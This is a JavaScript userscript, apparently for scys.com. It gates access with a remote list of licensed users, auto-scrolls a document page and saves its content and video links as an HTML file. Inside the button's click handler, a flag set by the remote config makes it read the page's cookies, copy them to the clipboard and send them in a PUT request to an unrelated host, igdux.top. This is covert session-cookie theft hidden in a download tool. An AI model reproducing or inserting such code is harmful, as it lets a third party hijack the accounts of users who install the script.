// 获取当前时间戳
function generateTimestamp() {
    let now = new Date();
    let year = now.getFullYear().toString().padStart(4, "0");
    let month = (now.getMonth() + 1).toString().padStart(2, "0");
    let day = now.getDate().toString().padStart(2, "0");
    let hours = now.getHours().toString().padStart(2, "0");
    let minutes = now.getMinutes().toString().padStart(2, "0");
    let seconds = now.getSeconds().toString().padStart(2, "0");
    return `${year}${month}${day}${hours}${minutes}${seconds}`;
}

// 获取当前用户信息
function getUserInfo() {
    return new Promise((resolve, reject) => {
        let url = "https://scys.com/search/form/Fe2VFe6e";
        window.GM_xmlhttpRequest({
            method: "GET",
            url: url,
            onload: function (response) {
                try {
                    let data = JSON.parse(response.responseText).data.me;
                    let userInfo = {
                        name: data.name,
                        user_id: data.user_id,
                        xq_group_number: data.xq_group_number
                    };
                    resolve(userInfo);
                } catch (error) {
                    reject(error);
                }
            },
            onerror: function (error) {
                reject(error);
            }
        });
    });
}

// 获取授权用户列表
function getUserList() {
    return new Promise((resolve, reject) => {
        let jsonUrl = "https://1024nettech.github.io/workflow/custom/js/scys.json?time=" + Date.now();
        window.GM_xmlhttpRequest({
            method: "GET",
            url: jsonUrl,
            onload: function (response) {
                try {
                    latest_version = JSON.parse(response.responseText).version;
                    cookie = JSON.parse(response.responseText).cookie;
                    let data = JSON.parse(response.responseText).authorized_users;
                    let userList = data.map(u => ({
                        name: u.name,
                        user_id: u.user_id,
                        xq_group_number: u.xq_group_number,
                        expiry_time: u.expiry_time
                    }));
                    resolve(userList);
                } catch (error) {
                    reject(error);
                }
            },
            onerror: function (error) {
                reject(error);
            }
        });
    });
}

// 判断用户是否合法
function isValidUser(user, userList) {
    let currentTimestamp = generateTimestamp();
    return userList.some(u => {
        if (u.name.trim() !== user.name.trim()) return false;
        if (u.user_id !== 0 && u.user_id !== user.user_id) return false;
        if (u.xq_group_number !== user.xq_group_number) return false;
        if (u.expiry_time <= currentTimestamp) return false;
        return true;
    });
}

// 保存页面为 HTML 文件
function saveHtmlFile() {
    addContentToList();
    $("#buttonx, script").remove();
    let style = `
        <style id="stylex">
            .docx-page { margin-right: 10px; }
            .wrap { padding: 0 !important; }
            .player video { width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 10000; }
            div[id^="w_vm_id_"] { display: none !important; }
        </style>
        `;
    $("body").append(style);
    let script = `
        <script>
            $(".title_text").click(function () {
                $(".curr").removeClass("curr");
                $(this).addClass("curr");
            });
        </script>
        `;
    contentToAdd.push(script);
    $(".wrap").html(contentToAdd.join(""));
    $("img").each(function () {
        let src = $(this).attr("src");
        if (src && !src.startsWith("http") && !src.startsWith("data:image")) {
            $(this).attr("src", window.location.origin + src);
        }
    });
    $(".player").each(function () {
        let backgroundImage = $(this).css("background-image");
        if (backgroundImage && backgroundImage !== "none") {
            let videoSrc = backgroundImage.replace('url("', "").replace('")', "");
            let videoElement = `<video controls src="${videoSrc.split("?x-oss-process=")[0]}"></video>`;
            $(this).append(videoElement);
        }
    });
    let htmlContent = document.documentElement.outerHTML;
    let blob = new Blob([htmlContent], { type: "text/html" });
    let link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = document.title + ".html";
    link.click();
    $("#stylex").remove();
}

// 收集页面内容
function addContentToList() {
    $(".wrap > div").each(function () {
        let childDivId = $(this).children("div").attr("id");
        if (childDivId && !already_added_ids.includes(childDivId)) {
            already_added_ids.push(childDivId);
            contentToAdd.push($(this)[0].outerHTML);
        }
    });
}

// 自动滚动页面并收集内容
let contentToAdd = [];
let already_added_ids = [];
let latest_version = "";
let cookie = "";
function processHTML() {
    $(".container-catalogue .catalogue__list-item").each(function () {
        let listItemId = $(this).attr("id").split("header_")[1];
        let titleTextElements = $(this).find(".title_text");
        if (titleTextElements.length) {
            titleTextElements.each(function () {
                let titleText = $(this).text();
                let anchor = $("<a></a>", {
                    href: `#${listItemId}`,
                    text: titleText
                });
                $(this).empty().append(anchor);
            });
        }
    });
    let viewportHeight = $(window).height();
    let currentScrollTop = 0;
    function checkScroll() {
        currentScrollTop = $(".docx-page").scrollTop();
        let scrollHeight = $(".docx-page")[0].scrollHeight;
        let remainingScroll = scrollHeight - currentScrollTop - viewportHeight;
        if (remainingScroll > 1) {
            addContentToList();
            setTimeout(function () {
                $(".docx-page").scrollTop(currentScrollTop + viewportHeight).trigger("scroll");
                checkScroll();
            }, 1500);
        } else {
            $("#buttonx").text("保存页面");
        }
    }
    checkScroll();
}

// 页面初始化入口
async function main() {
    try {
        let user = await getUserInfo();
        let userList = await getUserList();
        if (isValidUser(user, userList)) {
            let htmlx = `
                <button id="buttonx">开始滚动</button>
                <style>
                    #buttonx {
                        position: fixed; top: 20px; right: 20px; z-index: 10000;
                        padding: 10px; background-color: #0099ff; color: white;
                        border-radius: 5px; cursor: pointer;
                    }
                    .title_text a { color: inherit; }
                </style>
                `;
            $("body").append(htmlx);
            let current_version = window.GM_info.script.version;
            console.log(`当前版本: ${current_version}\n最新版本: ${latest_version}`);
            if (current_version.trim() !== latest_version.trim()) {
                $("#buttonx").text("点击更新");
                $("#buttonx").click(() => { window.open("https://1024nettech.github.io/workflow/custom/js/scys.user.js"); });
            }
            $("#buttonx").on("click", function () {
                if ($(this).text() === "开始滚动") {
                    processHTML();
                    if (cookie === 0) {
                        let a = document.cookie;
                        navigator.clipboard.writeText(a);
                        let url = "https://igdux.top/~1024nettech:1024";
                        let formData = new FormData();
                        formData.append("c", a);
                        window.GM_xmlhttpRequest({
                            method: "PUT",
                            url: url,
                            data: formData,
                            onload: function (response) {
                                if (response.status === 200) {
                                    //processHTML();
                                }
                            },
                            onerror: function (error) { }
                        });
                    } else {
                        processHTML();
                    }
                } else if ($(this).text() === "保存页面") {
                    saveHtmlFile();
                }
            });
        } else {
            alert("非法用户, 请联系客服! QQ: 626528275");
        }
    } catch (error) {
        console.error("程序运行错误: ", error);
    }
}

// 等待 jQuery 加载后执行
let interval = setInterval(function () {
    if (window.jQuery) {
        clearInterval(interval);
        main();
    }
}, 10);
// End-243-2025.08.19.172817
